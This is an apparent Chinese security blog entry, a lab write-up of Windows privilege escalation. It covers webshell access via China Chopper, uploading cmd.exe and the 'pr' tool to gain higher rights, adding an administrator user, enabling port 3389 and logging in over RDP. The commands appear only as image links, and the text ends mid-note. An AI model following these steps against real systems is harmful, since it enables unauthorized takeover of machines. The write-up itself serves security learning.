      <url>/2024/04/17/004-shi-yan-pr-ti-quan/</url>
      
        <content type="html"><![CDATA[<p>004 实验 -PR提权</p><h2 id="Contents"><a href="#Contents" class="headerlink" title="Contents"></a>Contents</h2><ul><li><a href="">Contents</a></li><li><a href="">实验</a></li><li><a href="">过程</a></li></ul><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p><img src="/.io//80fb0dad8a4b01a096584074e0ebbd69.png"></p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><ol><li>首先通过菜刀连接上</li></ol><p><img src="/.io//f4504305ca3d51477950ed7d10130c58.png"></p><ol start="2"><li>访问虚拟终端，查看一下权限<br><img src="/.io//8284934a8be272725dd9f95676288c72.png"><br><img src="/.io//8b909cd553be871e2df6fd8eab67b3e4.png"><br>发现拒绝访问，有可能是因为做了限制，是这里无法访问到cmd.exe<br>所以我们手动上传一个cmd.exe<br><img src="/.io//29c3133ab012e7e9036f91ec1b7c5c26.png"><br>访问这个cmd.exe<br><img src="/.io//401c4774741aadf0bba8bd0112366b6f.png"><br><img src="/.io//6be7978b8e14280dc162b890b8f3a9d3.png"><br>权限是service，权限不高</li><li>要进行提权<br>首先查看systeminfo，看看什么系统，打了什么补丁<br><img src="/.io//521585d7262799bceff230a3b89a6f7e.png"><br><img src="/.io//e54c802f97f74a0135cc1a785b48ad8d.png"></li><li>找一下什么提权漏洞可以利用<br><img src="/.io//854a2a94d93212403c98b1bf72d818ee.png"><br><img src="/.io//fedd6933da4cba365e4d2e02d47367a6.png"><br><img src="/.io//796e3cd9f5d9c5225a7a259fbb78401d.png"><br>发现可以用pr提权</li><li>上传pr提权工具<br><img src="/.io//ed8c0437822f373760e7813a82e6475d.png"></li><li>查看pr工具的使用<br><img src="/.io//281da3b37dac5696a3a6addd0b585289.png"><br>进行提权 (不知道为什么第一次会超时)<br><img src="/.io//03c1f2fbc40ef4b89791120ae16dcff1.png"><br>这个时候的用户权限提高了</li><li>利用pr程序添加管理员权限的用户<br>添加用户<br><img src="/.io//40bab25c5ea54e888799b78043d92531.png"><br>加入到管理员<br><img src="/.io//6391d6839065f10b55c52f02fb71d8dd.png"></li><li>查看3389远程连接端口是否开放<br><img src="/.io//8fa296fd320d554b7879c5b3ba7495b0.png"><br>发现3389端口未开放，打开3389<br>传入打开3389的脚本<br><img src="/.io//041a54ec0fef37b54a74a4114d4e88c1.png"><br>运行它<br><img src="/.io//ae4aa5e5cf46f9c10a1560b661be68f9.png"><br>查看3389端口已经打开<br><img src="/.io//caacbf98e9cc73446bba5663168ccdf7.png"></li><li>远程登录<br><img src="/.io//3427ba43569bb29fe30980ecbcc697da.png"><br><img src="/.io//d7b5e93612b45d99259cfa2a8e1b275e.png"><br>成功登录<br><img src="/.io//5a845cba82c3eeb6b8dbacb380480a3c.png"></li><li>这里面有个IIS6<br>有个IIS6的</li></ol>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
